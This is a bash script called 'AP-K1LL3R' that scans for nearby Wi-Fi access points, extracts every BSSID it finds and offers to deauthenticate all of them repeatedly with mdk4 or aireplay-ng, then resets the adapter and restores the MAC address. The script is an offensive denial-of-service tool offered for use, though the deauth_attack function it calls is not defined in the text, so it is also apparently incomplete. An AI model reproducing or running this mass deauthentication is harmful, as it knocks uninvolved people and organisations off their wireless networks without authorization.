#!/bin/bash
path=$(pwd)
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
MAGENTA="\e[35m"
CYAN="\e[36m"
RESTORE="\e[39"
BOLD="\e[1m"
NORMAL="\e[0m"
echo -e $BOLD"${CYAN}"
figlet AP-K1LL3R
sleep 1
echo ""
echo -e "${RED}[!] Important: ${MAGENTA}All errors will be saved in ${RED}$path/error.log
${MAGENTA}If you have any unexpected error, report it to my github:
${YELLOW}https://github.com/0n1cOn3/ap_killer
${RED}Version: v0.1.1
${MAGENTA}Creator: MrBlackX
${RED}Maintainer & Support: 0n1cOn3
"
echo -e "${GREEN}Starting script now..."
sleep 1
read -p "Press [Enter] to continue, press after 10 seconds CTRL+C. "
echo -e "${BLUE}[*] ${YELLOW}Scanning now for Access Points..."
sleep 1
echo -e "${BLUE}[*] ${YELLOW}Scanning in background for hosts.."
echo -e "${BLUE}[*] ${YELLOW}Press ${RED}CTRL+C ${YELLOW}to stop scan."
airodump-ng wlan0mon >> aps.txt
FILE='aps.txt'
sleep 0.5
echo -ne "${BLUE}[*] ${YELLOW}Successfully grabbed access points. Deauth ${CYAN}A${YELLOW}ll or ${CYAN}E${YELLOW}xit${CYAN}[A/E]?: "
read exc


# Check if exc is "A" or "a"
if [[ $exc == "A" || $exc == "a" ]]; then
  # Check if file exists
  if [ -f $FILE ]; then
    sleep 0.5
    echo -e "${BLUE}[*] ${YELLOW}File found ${GREEN}$path/$FILE"
  else
    echo -e "{BLUE}[!] ${YELLOW}File not found"
  fi
# Extract MAC addresses and save them to a file
cat aps.txt | grep : | cut -d\  -f1,2 | sed -e 's/[\t]//g;/^$/d' | sed -e 's/\CH//g' | head -n 1453 | tail -30 >> mac.txt 2>$path/error.log
FILE2='mac.txt'
if [ -f $FILE2 ]; then
  sleep 1
  echo -e "${BLUE}[*] ${YELLOW}Succefully extracted all mac addresses to: ${GREEN}$path/$FILE2"
else
  echo -e "${RED}[!] ${YELLOW}No file found, please re-run script or check ${RED}$path$FILE2"
  sleep 1
fi
sleep 1
sort mac.txt | uniq >> endresult.txt
rm mac.txt result.txt
count=$(wc -l $path/endresult.txt | cut -d\  -f1)
echo -e "${BLUE}[*] ${YELLOW}I have collected ${GREEN}$count ${YELLOW}available BSSIDs."
echo -ne  "${BLUE}[*] ${YELLOW}How many times do you want to deauth wifi(default:10): "
read count
echo -e  "${BLUE}[*] ${YELLOW}Selected ${RED}$count ${YELLOW}will starting in few seconds..."
read -p "[*] Do you want Mdk4 or Aireplay method?[M/A]: " method
# Perform the deauth attack
deauth_attack
# Disable adapter mode and restore original MAC
echo -e "${RED}[!] ${MAGENTA}Leaving..."
echo -e "${BLUE}[*] ${YELLOW}Disabling adapter mode.."
airmon-ng stop wlan0mon 2>$path/error.log
rm *.txt
echo -e "${BLUE}[*] ${YELLOW}Restoring original mac..."
ifconfig wlan0 down
macchanger -p wlan0 2>$path/error.log
ifconfig wlan0 up
service network-manager restart
